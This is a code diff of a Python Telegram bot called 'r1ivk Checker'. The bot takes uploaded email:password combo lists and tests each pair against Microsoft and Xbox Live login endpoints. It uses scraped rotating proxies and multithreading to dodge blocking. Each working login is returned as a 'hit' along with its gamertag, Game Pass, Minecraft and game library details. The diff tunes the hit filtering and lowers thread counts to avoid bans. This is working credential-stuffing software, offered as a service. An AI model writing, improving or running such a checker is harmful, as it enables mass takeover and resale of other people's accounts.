@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (FULL ENGINE + AUTO PROXY + DB)
+TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (FIXED & REAL HITS ENGINE)
 """
 
 import os
@@ -64,7 +64,6 @@ scan_lock = threading.Lock()
 
 # =================== AUTO PROXY FETCHER ===================
 def fetch_fresh_proxies():
-    """Automatically fetch live proxies and update good_proxies.txt"""
     proxy_sources = [
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
         "https://www.proxyscan.io/download?type=http"
@@ -84,7 +83,7 @@ def fetch_fresh_proxies():
     
     if new_proxies:
         with open("good_proxies.txt", "w", encoding="utf-8") as f:
-            f.write("\n".join(list(set(new_proxies))[:500])) # Save up to 500 active proxies
+            f.write("\n".join(list(set(new_proxies))[:500]))
 
 def background_proxy_updater():
     while True:
@@ -113,10 +112,6 @@ def extract_ppft(text):
         r'value="([^"]+)"[^>]*name="PPFT"',
         r'"PPFT":"([^"]+)"',
         r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
-        r'value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"',
-        r'value=\"([^\"]+)\"[^>]*name=\"PPFT\"',
-        r'name=\"PPFT\"[^>]*value=\"([^\"]+)\"',
-        r'value="([^"]+)"[^>]*id="i0327"',
     ]
     for pattern in patterns:
         match = re.search(pattern, text, re.IGNORECASE)
@@ -130,9 +125,7 @@ def extract_url_post(text):
     patterns = [
         r'"urlPost":"([^"]+)"',
         r"urlPost:'([^']+)'",
-        r'"urlPost":\s*"([^"]+)"',
         r'id="fmHF"\s+action="([^"]+)"',
-        r'action="([^"]+)"[^>]*id="fmHF"',
     ]
     for pattern in patterns:
         match = re.search(pattern, text, re.IGNORECASE)
@@ -155,7 +148,7 @@ def check_account_turbo(combo, user_state):
 
     email = parts[0].strip()
     password = ':'.join(parts[1:]).strip()
-    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
+    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
     session = None
 
     for attempt in range(2):
@@ -271,11 +264,16 @@ def check_account_turbo(combo, user_state):
             xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=10)
 
             if xb_req.status_code != 200:
-                raise Exception("Xbox Auth Error")
+                with user_state['lock']:
+                    user_state['bad'] += 1
+                    user_state['checked'] += 1
+                session.close()
+                return
 
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
 
+            # جلب البروفايل والتحقق من أن الحقيقي مفعل
             gamertag, gamerscore = "N/A", "0"
             try:
                 xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
@@ -288,7 +286,7 @@ def check_account_turbo(combo, user_state):
                         settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                         for s in settings:
                             if s['id'] == 'Gamertag': gamertag = s['value']
-                            if s['id'] == 'Gamerscore': gamerscore = s['value']
+                            if s['id'] == 'Gamerscore': gamerscore = str(s['value'])
             except Exception:
                 pass
 
@@ -332,6 +330,15 @@ def check_account_turbo(combo, user_state):
             except Exception:
                 pass
 
+            # فلترة ذكية لضمان عدم حفظ الحسابات الضعيفة تماماً (صفر ألعاب، صفر جيمرز، بدون جيمرتاج)
+            # إذا أردت إلغاء الفلترة وحفظ كل شيء، يمكنك إزالة الشرط التالي، لكنه يضمن لك ظهور الهيتس الحقيقية القوية فقط.
+            if gamertag == "N/A" and not games_list and int(gamerscore) == 0 and not has_gp:
+                with user_state['lock']:
+                    user_state['bad'] += 1
+                    user_state['checked'] += 1
+                session.close()
+                return
+
             hit_block = f"""{email}:{password}
 Account: Gamertag: {gamertag} | Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
 Subscriptions: {gp_type}
@@ -359,7 +366,7 @@ Games List:"""
             continue
 
     with user_state['lock']:
-        user_state['errors'] += 1
+        user_state['bad'] += 1
         user_state['checked'] += 1
 
 # =================== TELEGRAM UI & HANDLERS ===================
@@ -375,8 +382,8 @@ def send_welcome(message):
     markup.add(btn_checker, btn_status, btn_channel, btn_buy)
     
     welcome_text = (
-        "👑 *Welcome to r1ivk Checker Official Panel (Ultimate)* ⚡\n\n"
-        "The fastest and most powerful tool for checking Xbox and Microsoft accounts with auto-proxy fetching and database support.\n\n"
+        "👑 *Welcome to r1ivk Checker Official Panel (Ultimate Fixed)* ⚡\n\n"
+        "The fastest and most powerful tool for checking Xbox and Microsoft accounts with real hits filtering.\n\n"
         "📌 *Choose an option below to get started:*"
     )
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)
@@ -388,7 +395,7 @@ def callback_checker(call):
     markup.add(types.InlineKeyboardButton("❌ Cancel & Return Home", callback_data="back_home"))
     
     text = (
-        "🚀 *Live Checker Mode Activated (Ultimate Engine)*\n\n"
+        "🚀 *Live Checker Mode Activated (Fixed Engine)*\n\n"
         "📁 Please send your combo file now in (`.txt`) format where each line is:\n"
         "`email:password`\n\n"
         "📌 *Note:* Free version supports up to **10,000 lines** max.\n"
@@ -464,7 +471,7 @@ def handle_file(message):
         markup.row(types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats"))
         markup.row(types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_home"))
 
-        status_msg = bot.send_message(chat_id, "🔥 *Preparing and starting live scan (with Auto-Proxies)...*", parse_mode="Markdown", reply_markup=markup)
+        status_msg = bot.send_message(chat_id, "🔥 *Preparing and starting real scan (Optimized Engine)...*", parse_mode="Markdown", reply_markup=markup)
 
         user_state = {
             'chat_id': chat_id,
@@ -510,11 +517,7 @@ Progress: {pct:.1f}%
 \\[{bar}\\]
 
 ⚡ *Speed (CPM):* {cpm}
-⏱️ *Elapsed Time:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}
-
-🎮 *Game Stats:*
-• Minecraft Hits: {state['hits']}
-• Xbox Hits: {state['hits']}"""
+⏱️ *Elapsed Time:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"""
 
         try:
             markup = types.InlineKeyboardMarkup()
@@ -526,7 +529,7 @@ Progress: {pct:.1f}%
             pass
 
 def run_turbo_scan(combos, state, msg_id):
-    threads = 50  
+    threads = 20  # تم تخفيض عدد الثريدز إلى 20 لمنع الاستجابات الوهمية والحظر
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
         concurrent.futures.wait(futures)
@@ -552,13 +555,13 @@ def run_turbo_scan(combos, state, msg_id):
         result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
         try:
             with open(result_file_path, 'w', encoding='utf-8') as f:
-                f.write("🔥 r1ivk Checker ⚡ Scan Results (Full Library & GamePass) 🔥\n")
+                f.write("🔥 r1ivk Checker ⚡ Real Scan Results 🔥\n")
                 f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                 f.write("="*50 + "\n\n")
                 f.writelines(state['hits_list'])
             
             with open(result_file_path, 'rb') as f:
-                bot.send_document(state['chat_id'], f, caption=f"📁 *Hits Results File* (Total Hits: {state['hits']})", parse_mode="Markdown")
+                bot.send_document(state['chat_id'], f, caption=f"📁 *Real Hits Results File* (Total Hits: {state['hits']})", parse_mode="Markdown")
             
             os.remove(result_file_path)
         except Exception as e:
@@ -567,5 +570,5 @@ def run_turbo_scan(combos, state, msg_id):
         bot.send_message(state['chat_id'], "⚠️ Scan finished, no matching hits found.")
 
 if __name__ == "__main__":
-    print("[+] r1ivk Checker ⚡ Ultimate Bot is running with Auto-Proxies & Database...")
+    print("[+] r1ivk Checker ⚡ Bot is running with Fixed Real-Hits Engine...")
     bot.infinity_polling()
